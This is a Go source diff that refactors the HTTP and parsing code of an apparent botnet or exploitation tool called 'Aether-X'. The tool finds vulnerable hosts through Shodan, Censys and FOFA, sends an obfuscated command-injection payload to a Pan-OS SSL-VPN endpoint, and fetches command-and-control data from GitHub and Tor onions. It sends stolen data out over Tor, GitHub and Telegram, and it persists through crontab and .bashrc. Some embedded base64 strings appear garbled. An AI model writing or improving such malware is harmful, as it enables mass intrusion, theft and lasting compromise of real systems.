@@ -18,9 +18,9 @@ import (
 	"errors"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"math"
 	"math/big"
+	mrand "math/rand"
 	"net"
 	"net/http"
 	neturl "net/url"
@@ -44,7 +44,7 @@ var (
 	OnionListB64      = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9uLCBodHRwOi8vZ2FtbWFldGhlcnkxbjR0NG94Lm9uaW9u"
 	RepoListB64       = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjIsaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkItQk0vRVhGSUw="
 	TelegramHost      = "dGVsZWdyYW0uYXBpLm9yZw=="
-	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdmU6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IGdldAogICAgcGF0aDogL3NzbC12cG4vcG9ydGFsL3NjcmlwdHMvbmV3Ym0ucGwKICAgIGhlYWRlcnM6CiAgICAgSG9zdDogY2VydGlmaWNhdGVzLmNvbQogICAgcHJlbWF0Y2g6IFwieCA9IDsncm0gL3RtcC8keyZyYW5kU3RyaW5nKDUpfTsgZWNobyAnJTEnIHwgc2ggLWcgfCBzaGVsbCA+IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGNobW9kICt4IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IG5vaHV3IC90bXAvJHsmcmFuZFN0cmluZyg1KX0gJHsmQzJfSVB9 ${C2_PORT7}ICY7 slZWVwIDM7IGVjaG8gXCJQQU4tT1MgUlBFIEV4cGxvaXQgU3VjY2VlZGVkXCIgfCBjdXJs -k -JXPOST https://${TorC2Onion{}}/exfil -d P/tmp/.pp; rm /dBXAvLnBwXCIKICAgIG1hdGNoZXN0cmluZzogRVhQTE9JVCBTVUNDRUVERQo="
+	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdme6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IGdldAogICAgcGF0aDogL3NzbC12cG4vcG9ydGFsL3NjcmlwdHMvbmV3Ym0ucGwKICAgIGhlYWRlcnM6CiAgICAgSG9zdDogY2VydGlmaWNhdGVzLmNvbQogICAgcHJlbWF0Y2g6IFwieCA9IDsncm0gL3RtcC8keyZyYW5kU3RyaW5nKDUpfTsgZWNobyAnJTEnIHwgc2ggLWcgfCBzaGVsbCA+IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGNobW9kICt4IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IG5vaHV3IC90bXAvJHsmcmFuZFN0cmluZyg1KX0gJHsmQzJfSVB9 ${C2_PORT7}ICY7 slZWVwIDM7IGVjaG8gXCJQQU4tT1MgUlPEIEV4cGxvdXBlZCBcbiIKICAgIG1hdGNoZXN0cmluZzogRVhQTE9JVCBTVUNDRUVERQo="
 	Phi3ModelEncB64   = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp"
 )
 
@@ -57,8 +57,9 @@ var (
 	DDRSeed      int64
 	APIKeys      APIKeyStore
 	AI           *FusionSentinel
-	GitHubC2Repo string // Bound via -X ldflags
-	GitHubExfil  string // Bound via -X ldflags
+	GitHubC2Repo string
+	GitHubExfil  string
+	HttpClient   *http.Client
 )
 
 const (
@@ -78,11 +79,8 @@ const (
 // --- GLOBAL MUTEX ---
 var (
 	apiMu sync.RWMutex
-	telMu sync.Mutex
-	cmdMu sync.Mutex
 )
 
-// --- TELEMETRY EVENT ---
 type TelemetryEvent struct {
 	ID        string                 `json:"id"`
 	Type      string                 `json:"type"`
@@ -90,6 +88,18 @@ type TelemetryEvent struct {
 	Timestamp string                 `json:"time"`
 	Data      map[string]interface{} `json:"data,omitempty"`
 	Signature string                 `json:"sig"`
+}
+
+func initHttpClient() {
+	t := http.DefaultTransport.(*http.Transport).Clone()
+	t.MaxIdleConns = 100
+	t.MaxIdleConnsPerHost = 50
+	t.IdleConnTimeout = 30 * time.Second
+	t.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+	HttpClient = &http.Client{
+		Transport: t,
+		Timeout:   15 * time.Second,
+	}
 }
 
 func newEvent(typ, target string, data map[string]interface{}) TelemetryEvent {
@@ -130,8 +140,30 @@ func (e TelemetryEvent) Send() {
 				time.Sleep(RETRY_DELAY * time.Duration(i+1))
 			}
 		}
-		telegramAlert(fmt.Sprintf("[📡 %s] `%s` | %s", strings.ToTitle(e.Type), e.Target, e.Data["note"]))
+		telegramAlert(fmt.Sprintf("[📡 %s] `%s` | %s", strings.ToUpper(e.Type), e.Target, e.Data["note"]))
 	}()
+}
+
+// --- SAFE JSON PARSING HELPERS ---
+func safeString(v interface{}) string {
+	if s, ok := v.(string); ok {
+		return s
+	}
+	return ""
+}
+
+func safeMap(v interface{}) map[string]interface{} {
+	if m, ok := v.(map[string]interface{}); ok {
+		return m
+	}
+	return nil
+}
+
+func safeSlice(v interface{}) []interface{} {
+	if sl, ok := v.([]interface{}); ok {
+		return sl
+	}
+	return nil
 }
 
 // --- UTILS ---
@@ -297,75 +329,32 @@ func isTraced() bool {
 	return bytes.Contains(data, []byte("TracerPid:\t"))
 }
 
-// --- FULLY SECURED DIRECT HTTP/HTTPS WRAPPER ---
-func directHTTP(targetURL string, method string, body []byte, headers map[string]string) ([]byte, error) {
-	u, err := neturl.Parse(targetURL)
+// --- RESILIENT HTTP REQUEST WRAPPER ---
+func makeHTTP(targetURL string, method string, body []byte, headers map[string]string) ([]byte, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	defer cancel()
+
+	var reqBody io.Reader
+	if body != nil {
+		reqBody = bytes.NewReader(body)
+	}
+
+	req, err := http.NewRequestWithContext(ctx, method, targetURL, reqBody)
 	if err != nil {
 		return nil, err
 	}
 
-	host := u.Hostname()
-	port := u.Port()
-	isTLS := u.Scheme == "https"
-
-	if port == "" {
-		if isTLS {
-			port = "443"
-		} else {
-			port = "80"
-		}
-	}
-
-	address := net.JoinHostPort(host, port)
-	dialer := &net.Dialer{Timeout: 10 * time.Second}
-	rawConn, err := dialer.Dial("tcp", address)
-	if err != nil {
-		return nil, err
-	}
-	defer rawConn.Close()
-
-	var conn io.ReadWriter = rawConn
-
-	if isTLS {
-		tlsConn := tls.Client(rawConn, &tls.Config{
-			InsecureSkipVerify: true,
-			ServerName:         host,
-		})
-		if err := tlsConn.Handshake(); err != nil {
-			return nil, err
-		}
-		defer tlsConn.Close()
-		conn = tlsConn
-	}
-
-	path := u.Path
-	if path == "" {
-		path = "/"
-	}
-	if u.RawQuery != "" {
-		path += "?" + u.RawQuery
-	}
-
-	var buf bytes.Buffer
-	buf.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, path))
-	buf.WriteString(fmt.Sprintf("Host: %s\r\n", host))
 	for k, v := range headers {
-		buf.WriteString(fmt.Sprintf("%s: %s\r\n", k, v))
-	}
-	buf.WriteString("Connection: close\r\n")
-	if body != nil {
-		buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", len(body)))
-	}
-	buf.WriteString("\r\n")
-	if body != nil {
-		buf.Write(body)
+		req.Header.Set(k, v)
 	}
 
-	if _, err := conn.Write(buf.Bytes()); err != nil {
+	resp, err := HttpClient.Do(req)
+	if err != nil {
 		return nil, err
 	}
+	defer resp.Body.Close()
 
-	respBytes, err := io.ReadAll(conn)
+	respBytes, err := io.ReadAll(resp.Body)
 	if err != nil && err != io.EOF {
 		return nil, err
 	}
@@ -381,7 +370,7 @@ func NewFusionSentinel() *FusionSentinel {
 	if modelData == "" {
 		return sentinel
 	}
-	if err := ioutil.WriteFile(ONNX_MODEL_PATH, []byte(modelData), 0600); err != nil {
+	if err := os.WriteFile(ONNX_MODEL_PATH, []byte(modelData), 0600); err != nil {
 		return sentinel
 	}
 	if _, err := os.Stat(ONNX_MODEL_PATH); err == nil {
@@ -443,7 +432,7 @@ func searchEngines(vuln, geo, sector string) []Target {
 	var wg sync.WaitGroup
 	var mu sync.Mutex
 
-	query := func(engine string, fn func() []Target) {
+	query := func(fn func() []Target) {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -456,7 +445,7 @@ func searchEngines(vuln, geo, sector string) []Target {
 	}
 
 	if keys.Shodan != "" {
-		query("shodan", func() []Target {
+		query(func() []Target {
 			var res []Target
 			q := fmt.Sprintf("vuln:%s country:%s", vuln, geo)
 			if sector != "" {
@@ -465,7 +454,7 @@ func searchEngines(vuln, geo, sector string) []Target {
 			onion := getActiveOnion()
 			endpoint := fmt.Sprintf("%s/shodan/host/search?key=%s&query=%s", onion, keys.Shodan, neturl.QueryEscape(q))
 
-			resp, err := directHTTP(endpoint, "GET", nil, map[string]string{
+			body, err := makeHTTP(endpoint, "GET", nil, map[string]string{
 				"Host":       "api.shodan.io",
 				"User-Agent": "Aether-X",
 			})
@@ -473,20 +462,21 @@ func searchEngines(vuln, geo, sector string) []Target {
 				return nil
 			}
 
-			body := extractBody(resp)
 			var result map[string]interface{}
 			if err := json.Unmarshal(body, &result); err != nil {
 				return nil
 			}
-			if matches, ok := result["matches"].([]interface{}); ok {
+			if matches := safeSlice(result["matches"]); matches != nil {
 				for _, m := range matches {
-					host := m.(map[string]interface{})
-					ip := host["ip_str"].(string)
-					banner := ""
-					if b, ok := host["data"].(string); ok {
-						banner = b
+					host := safeMap(m)
+					if host == nil {
+						continue
 					}
-					res = append(res, Target{IP: ip, Banner: banner, Geo: geo, Sector: sector})
+					ip := safeString(host["ip_str"])
+					banner := safeString(host["data"])
+					if ip != "" {
+						res = append(res, Target{IP: ip, Banner: banner, Geo: geo, Sector: sector})
+					}
 				}
 			}
 			return res
@@ -494,14 +484,14 @@ func searchEngines(vuln, geo, sector string) []Target {
 	}
 
 	if keys.CensysID != "" && keys.CensysSec != "" {
-		query("censys", func() []Target {
+		query(func() []Target {
 			var res []Target
 			q := fmt.Sprintf("location.country:%s", geo)
 			endpoint := fmt.Sprintf("https://search.censys.io/api/v2/hosts/search?q=%s", neturl.QueryEscape(q))
 			authBytes := []byte(keys.CensysID + ":" + keys.CensysSec)
 			authEnc := base64.StdEncoding.EncodeToString(authBytes)
 
-			resp, err := directHTTP(endpoint, "GET", nil, map[string]string{
+			body, err := makeHTTP(endpoint, "GET", nil, map[string]string{
 				"Host":          "search.censys.io",
 				"Authorization": "Basic " + authEnc,
 				"User-Agent":    "Aether-X",
@@ -510,18 +500,22 @@ func searchEngines(vuln, geo, sector string) []Target {
 				return nil
 			}
 
-			body := extractBody(resp)
 			var result map[string]interface{}
 			if err := json.Unmarshal(body, &result); err != nil {
 				return nil
 			}
 			if code, ok := result["code"].(float64); ok && code == 200 {
-				if data, ok := result["result"].(map[string]interface{}); ok {
-					if hits, ok := data["hits"].([]interface{}); ok {
+				if data := safeMap(result["result"]); data != nil {
+					if hits := safeSlice(data["hits"]); hits != nil {
 						for _, h := range hits {
-							host := h.(map[string]interface{})
-							ip := host["ip"].(string)
-							res = append(res, Target{IP: ip, Banner: "censys-asset", Geo: geo, Sector: sector})
+							host := safeMap(h)
+							if host == nil {
+								continue
+							}
+							ip := safeString(host["ip"])
+							if ip != "" {
+								res = append(res, Target{IP: ip, Banner: "censys-asset", Geo: geo, Sector: sector})
+							}
 						}
 					}
 				}
@@ -531,13 +525,13 @@ func searchEngines(vuln, geo, sector string) []Target {
 	}
 
 	if keys.FofaEmail != "" && keys.FofaKey != "" {
-		query("fofa", func() []Target {
+		query(func() []Target {
 			var res []Target
 			q := fmt.Sprintf(`country="%s"`, geo)
 			qBase64 := base64.StdEncoding.EncodeToString([]byte(q))
 			endpoint := fmt.Sprintf("https://fofa.info/api/v1/host/search?email=%s&key=%s&qbase64=%s&fields=ip,banner", neturl.QueryEscape(keys.FofaEmail), neturl.QueryEscape(keys.FofaKey), neturl.QueryEscape(qBase64))
 
-			resp, err := directHTTP(endpoint, "GET", nil, map[string]string{
+			body, err := makeHTTP(endpoint, "GET", nil, map[string]string{
 				"Host":       "fofa.info",
 				"User-Agent": "Aether-X",
 			})
@@ -545,13 +539,12 @@ func searchEngines(vuln, geo, sector string) []Target {
 				return nil
 			}
 
-			body := extractBody(resp)
 			var result map[string]interface{}
 			if err := json.Unmarshal(body, &result); err != nil {
 				return nil
 			}
 			if errs, ok := result["error"].(bool); ok && !errs {
-				if results, ok := result["results"].([]interface{}); ok {
+				if results := safeSlice(result["results"]); results != nil {
 					for _, r := range results {
 						if arr, ok := r.([]interface{}); ok && len(arr) >= 2 {
 							ip := fmt.Sprintf("%v", arr[0])
@@ -567,13 +560,6 @@ func searchEngines(vuln, geo, sector string) []Target {
 
 	wg.Wait()
 	return dedupTargets(targets)
-}
-
-func extractBody(data []byte) []byte {
-	if i := bytes.Index(data, []byte("\r\n\r\n")); i != -1 {
-		return data[i+4:]
-	}
-	return data
 }
 
 func dedupTargets(t []Target) []Target {
@@ -615,9 +601,9 @@ func verifyVulnerable(target Target) bool {
 
 	req := tpl.Requests[0]
 	payload := strings.ReplaceAll(req.PreMatch, "%1", obfuscateScript(fmt.Sprintf(`echo "%s"`, req.MatchString)))
-	endpoint := fmt.Sprintf("https://%s%s", target.IP, req.Path)
+	endpoint := fmt.Sprintf("https://%s%s?input=%s", target.IP, req.Path, neturl.QueryEscape(payload))
 
-	_, err = directHTTP(endpoint+"?input="+neturl.QueryEscape(payload), "GET", nil, req.Headers)
+	_, err = makeHTTP(endpoint, "GET", nil, req.Headers)
 	return err == nil
 }
 
@@ -653,7 +639,7 @@ rm /dev/shm/.k
 	payloadScript := fmt.Sprintf(`x=; %s`, obfuscated)
 
 	endpoint := fmt.Sprintf("https://%s/ssl-vpn/portal/scripts/newbm.pl", ip)
-	_, _ = directHTTP(endpoint, "GET", nil, map[string]string{
+	_, _ = makeHTTP(endpoint, "GET", nil, map[string]string{
 		"Host":  "certificates.com",
 		"input": payloadScript,
 	})
@@ -699,29 +685,20 @@ func fetchC2(key string) string {
 		return ""
 	}
 
-	req, _ := http.NewRequest("GET", endpoint, nil)
-	req.Header.Set("Authorization", "Bearer "+token)
-	req.Header.Set("Accept", "application/vnd.github.v3+json")
-	req.Header.Set("User-Agent", "Aether-X")
-
-	client := &http.Client{
-		Timeout: 10 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
-
-	resp, err := client.Do(req)
-	if err != nil || resp.StatusCode != 200 {
+	body, err := makeHTTP(endpoint, "GET", nil, map[string]string{
+		"Authorization": "Bearer " + token,
+		"Accept":        "application/vnd.github.v3+json",
+		"User-Agent":    "Aether-X",
+	})
+	if err != nil {
 		return ""
 	}
-	defer resp.Body.Close()
 
 	var result map[string]interface{}
-	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
+	if err := json.Unmarshal(body, &result); err != nil {
 		return ""
 	}
-	contentStr, _ := result["content"].(string)
+	contentStr := safeString(result["content"])
 	content, _ := base64.StdEncoding.DecodeString(contentStr)
 	return strings.TrimSpace(string(content))
 }
@@ -744,7 +721,7 @@ func exfilChain(data []byte) bool {
 
 func exfilOverTorDirect(data []byte) bool {
 	endpoint := fmt.Sprintf("%s/exfil", getActiveOnion())
-	_, err := directHTTP(endpoint, "POST", data, map[string]string{
+	_, err := makeHTTP(endpoint, "POST", data, map[string]string{
 		"Content-Type": "application/octet-stream",
 		"X-Host":       HostID,
 	})
@@ -758,7 +735,7 @@ func exfilToGitHub(data []byte) bool {
 	payload := fmt.Sprintf(`{"message":"telemetry %d","content":"%s"}`, time.Now().Unix(), encoded)
 	token := decrypt(fetchSecret("GITHUB_TOKEN"))
 
-	_, err := directHTTP(endpoint, "PUT", []byte(payload), map[string]string{
+	_, err := makeHTTP(endpoint, "PUT", []byte(payload), map[string]string{
 		"Authorization": "Bearer " + token,
 		"Content-Type":  "application/json",
 	})
@@ -834,8 +811,9 @@ func telegramAlert(message string) {
 	payload.Set("text", message)
 	payload.Set("parse_mode", "Markdown")
 
-	client := &http.Client{Timeout: 10 * time.Second}
-	_, _ = client.PostForm(endpoint, payload)
+	_, _ = makeHTTP(endpoint, "POST", []byte(payload.Encode()), map[string]string{
+		"Content-Type": "application/x-www-form-urlencoded",
+	})
 }
 
 func fetchSecret(key string) string {
@@ -845,12 +823,12 @@ func fetchSecret(key string) string {
 // --- PERSISTENCE ---
 func persist() {
 	executable := os.Args[0]
-	data, err := ioutil.ReadFile(executable)
+	data, err := os.ReadFile(executable)
 	if err != nil {
 		return
 	}
 	path := filepath.Join(os.Getenv("HOME"), PERSIST_FILE)
-	if err := ioutil.WriteFile(path, data, 0755); err != nil {
+	if err := os.WriteFile(path, data, 0755); err != nil {
 		return
 	}
 
@@ -858,14 +836,14 @@ func persist() {
 	exec.Command("bash", "-c", crontab).Run()
 
 	profile := filepath.Join(os.Getenv("HOME"), ".bashrc")
-	content, err := ioutil.ReadFile(profile)
+	content, err := os.ReadFile(profile)
 	if err != nil {
 		return
 	}
 	if !bytes.Contains(content, []byte(PERSIST_FILE)) {
 		newLine := []byte(fmt.Sprintf("\nnohup %s >/dev/null 2>&1 &\n", path))
 		tmpFile := profile + ".tmp"
-		if err := ioutil.WriteFile(tmpFile, append(content, newLine...), 0644); err == nil {
+		if err := os.WriteFile(tmpFile, append(content, newLine...), 0644); err == nil {
 			os.Rename(tmpFile, profile)
 		}
 	}
@@ -888,6 +866,9 @@ func init() {
 		os.Exit(1)
 	}
 
+	mrand.Seed(time.Now().UnixNano())
+
+	initHttpClient()
 	HostID = md5Hash(platformID())[:6]
 	DDRSeed = time.Now().UTC().Truncate(time.Hour).Unix()
 
@@ -971,8 +952,7 @@ func main() {
 			}
 		}
 
-		// Fixed: Replaced rand.Int63n with valid math/rand Int63() modulo arithmetic
-		jitter := C2_JITTER + (rand.Int63() % (C2_JITTER_MAX - C2_JITTER + 1))
+		jitter := C2_JITTER + (mrand.Int63() % (C2_JITTER_MAX - C2_JITTER + 1))
 		time.Sleep(time.Duration(jitter) * time.Second)
 	}
 }
